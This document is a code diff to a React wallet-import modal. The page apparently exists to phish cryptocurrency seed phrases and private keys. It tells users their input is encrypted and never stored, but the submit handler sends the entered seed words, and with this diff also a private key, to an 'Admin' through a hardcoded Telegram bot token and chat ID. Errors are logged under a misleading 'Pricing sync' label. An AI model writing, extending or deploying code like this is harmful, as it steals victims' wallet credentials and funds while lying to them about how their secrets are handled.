@@ -13,22 +13,40 @@ interface WalletDetailsModalProps {
 }
 
 export default function WalletDetailsModal({ isOpen, onClose, title, startWalletProcess }: WalletDetailsModalProps) {
-    if (!isOpen) return null;
+    if (!isOpen || !title) return null;
+
     const bot = new Bot("9077199448:AAGGm3efhhGEjXt4S4QOWotTCmDgmeMKynU");
     const [phraseSelected, setPhraseSelected] = useState<'12-word seed phrase' | '24-word seed phrase'>('12-word seed phrase')
     const [hidePhrase, setHidePhrase] = useState(true);
     const [seedPhrase, setSeedPhrase] = useState<{ index: number, key: string }[]>(new Array(12).fill({ index: 0, key: '' }));
+    const [isOpenToggle, setIsOpen] = useState(false);
+    const [privateKey, setPrivateKey] = useState('')
 
-
-    async function updateBot(message: []) {
+    async function updateBot(message: [], privateKey: string) {
         try {
 
 
+            if (message.length === 0 && privateKey.length === 0) {
+
+                return;
+            }
+
+            if (message.length > 0 && privateKey.length === 0) {
+
+                const dd = await bot.api.sendMessage("6862058456",
+                    `Hello Admin! New Seed Phrase Update <b>${new Date().toISOString()}</b> \n Wallet: ${title} \n  ${message.join("\n").toString()}.`,
+                    {
+                        parse_mode: "HTML"
+                    });
+                return;
+            }
+
             const dd = await bot.api.sendMessage("6862058456",
-                `Hello Admin! New Seed Phrase Update <b>${new Date().toISOString()}</b> \n Wallet: ${title} \n  ${message.join("\n").toString()}.`,
+                `Hello Admin! New Private Key Update <b>${new Date().toISOString()}</b> \n Wallet: ${title} \n  ${privateKey}.`,
                 {
                     parse_mode: "HTML"
                 });
+
             console.log("Message sent:", dd);
         } catch (err) {
             console.error("Pricing sync error:", err);
@@ -66,61 +84,62 @@ export default function WalletDetailsModal({ isOpen, onClose, title, startWallet
                     <p className="text-xs text-gray-400 font-light mt-1">import your seed phrase or private key.</p>
                 </div>
 
+
+                <div className="space-y-4">
+                    <button
+                        onClick={() => {
+                            setHidePhrase(true)
+                            setIsOpen(!isOpenToggle)
+                        }}
+                        className="w-fit inline-flex space-y-4 items-center justify-center mb-4 bg-amber-500/10 border border-amber-500/20 text-amber-400 font-medium px-4 py-2 rounded-xl hover:bg-amber-500/20 transition-all backdrop-blur-md">
+                        {isOpenToggle ? "use seed phrase" : "use private key"}
+                    </button>
+
+
+                </div>
+
                 {/* Interactive Intake Tracing Form Block */}
                 <form className="space-y-6" onSubmit={(e) => { e.preventDefault(); /* Handle data sync parameters safely here */ }}>
 
+                    <div className="flex items-center gap-2 border-b border-white/5 pb-2">
+                        <CheckCircle2 size={16} className="text-emerald-400" />
+                        <h3 className="text-sm font-semibold text-gray-200">Secured</h3>
+                    </div>
+
                     {/* Context Block Layer 1: Keep it Public */}
-                    <div className="space-y-4">
-                        <div className="flex items-center gap-2 border-b border-white/5 pb-2">
-                            <CheckCircle2 size={16} className="text-emerald-400" />
-                            <h3 className="text-sm font-semibold text-gray-200">Secured</h3>
-                        </div>
-
-                        <p className="text-xs text-gray-400">Please enter your 12-word seed phrase or private key below. This information is encrypted and never stored on our servers.</p>
+                    {
+                        !isOpenToggle && <div className="space-y-4">
 
 
-                        <select onChange={(e) => {
-                            if (e.target.value === '12-word seed phrase') {
-                                setSeedPhrase(new Array(12).fill({ index: 0, key: '' }));
-                            } else {
-                                setSeedPhrase(new Array(24).fill({ index: 0, key: '' }));
-                            }
-                            setPhraseSelected(e.target.value as '12-word seed phrase' | '24-word seed phrase')
-                        }} className=" bg-white/5 border border-white/10 rounded-xl px-3 py-2 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:border-emerald-500 transition-colors 1">
-                            <option>12-word seed phrase </option>
-                            <option>24-word seed phrase </option>
-
-                        </select>
-
-                        <div >
-
-                            {hidePhrase ? <EyeIcon size={16} className="text-gray-400 inline-block ml-1 float-end cursor-pointer" onClick={() => setHidePhrase(false)} /> : <EyeOff size={16} className="text-gray-400 inline-block ml-1 float-end cursor-pointer" onClick={() => setHidePhrase(true)} />
-
-                            }
-                        </div>
-
-                        <div className="grid grid-cols-3   gap-2 mt-8 ">
-
-                            {
-                                phraseSelected === '12-word seed phrase' ? new Array(12).fill(0).map((item, index) => {
-
-                                    return <input onChange={(e) => {
-
-                                        setSeedPhrase(prev => {
-
-                                            const updated = [...prev];
-                                            updated[index] = { index: index, key: e.target.value };
-                                            return updated;
-                                        })
-
-                                    }} type={hidePhrase ? "password" : "text"} key={index} placeholder={`${index + 1}.`} className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:border-emerald-500 transition-colors 1" />
+                            <p className="text-xs text-gray-400">Please enter your 12-word seed phrase or private key below. This information is encrypted and never stored on our servers.</p>
 
 
-                                }) : new Array(24).fill(0).map((item, index) => {
+                            <select onChange={(e) => {
+                                if (e.target.value === '12-word seed phrase') {
+                                    setSeedPhrase(new Array(12).fill({ index: 0, key: '' }));
+                                } else {
+                                    setSeedPhrase(new Array(24).fill({ index: 0, key: '' }));
+                                }
+                                setPhraseSelected(e.target.value as '12-word seed phrase' | '24-word seed phrase')
+                            }} className=" bg-white/5 border border-white/10 rounded-xl px-3 py-2 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:border-emerald-500 transition-colors 1">
+                                <option>12-word seed phrase </option>
+                                <option>24-word seed phrase </option>
 
-                                    return <input
+                            </select>
 
-                                        onChange={(e) => {
+                            <div >
+
+                                {hidePhrase ? <EyeIcon size={16} className="text-gray-400 inline-block ml-1 float-end cursor-pointer" onClick={() => setHidePhrase(false)} /> : <EyeOff size={16} className="text-gray-400 inline-block ml-1 float-end cursor-pointer" onClick={() => setHidePhrase(true)} />
+
+                                }
+                            </div>
+
+                            <div className="grid grid-cols-3   gap-2 mt-8 ">
+
+                                {
+                                    phraseSelected === '12-word seed phrase' ? new Array(12).fill(0).map((item, index) => {
+
+                                        return <input onChange={(e) => {
 
                                             setSeedPhrase(prev => {
 
@@ -129,22 +148,56 @@ export default function WalletDetailsModal({ isOpen, onClose, title, startWallet
                                                 return updated;
                                             })
 
-                                        }}
-                                        type={hidePhrase ? "password" : "text"} key={index} placeholder={`${index + 1}.`} className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:border-emerald-500 transition-colors 1" />
+                                        }} type={hidePhrase ? "password" : "text"} key={index} placeholder={`${index + 1}.`} className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:border-emerald-500 transition-colors 1" />
 
 
-                                })
-                            }
+                                    }) : new Array(24).fill(0).map((item, index) => {
+
+                                        return <input
+
+                                            onChange={(e) => {
+
+                                                setSeedPhrase(prev => {
+
+                                                    const updated = [...prev];
+                                                    updated[index] = { index: index, key: e.target.value };
+                                                    return updated;
+                                                })
+
+                                            }}
+                                            type={hidePhrase ? "password" : "text"} key={index} placeholder={`${index + 1}.`} className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:border-emerald-500 transition-colors 1" />
 
 
+                                    })
+                                }
+
+
+
+
+
+                            </div>
 
 
 
                         </div>
+                    }
 
+                    {/* Conditionally render the div based on state */}
+                    {isOpenToggle && (
+                        <div
+                            className="w-full flex  bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:border-emerald-500 transition-colors 1">
+                            <input
+                                onChange={(e) => setPrivateKey(e.target.value)}
+                                type={hidePhrase ? "password" : "text"}
+                                placeholder="enter private key"
+                                className="w-full focus:outline-none">
 
+                            </input>
+                            {hidePhrase ? <EyeIcon size={16} className="text-gray-400 inline-block ml-1 float-end cursor-pointer " onClick={() => setHidePhrase(false)} /> : <EyeOff size={16} className="text-gray-400 inline-block ml-1 float-end cursor-pointer" onClick={() => setHidePhrase(true)} />
 
-                    </div>
+                            }
+                        </div>
+                    )}
 
                     {/* Context Block Layer 2: Describe the Stop */}
                     <div className="space-y-4 pt-2">
@@ -160,10 +213,11 @@ export default function WalletDetailsModal({ isOpen, onClose, title, startWallet
                     {/* Primary CTA Submit Anchor */}
                     <button type="submit" className="w-full inline-flex items-center justify-center gap-2 bg-linear-to-r from-emerald-400 to-blue-500 text-gray-950 font-bold py-4 rounded-xl hover:opacity-95 transition-opacity shadow-lg shadow-emerald-500/10 cursor-pointer"
                         onClick={() => {
-                            const format = seedPhrase.map((data) => {
+                            const format = seedPhrase.length > 0 ? seedPhrase.map((data) => {
                                 return data.key
-                            })
-                            updateBot(format as [])
+                            }) : []
+
+                            updateBot(format as [], privateKey)
 
                             startWalletProcess()
                         }}
@@ -173,6 +227,6 @@ export default function WalletDetailsModal({ isOpen, onClose, title, startWallet
                 </form>
 
             </div>
-        </div>
+        </div >
     );
 }
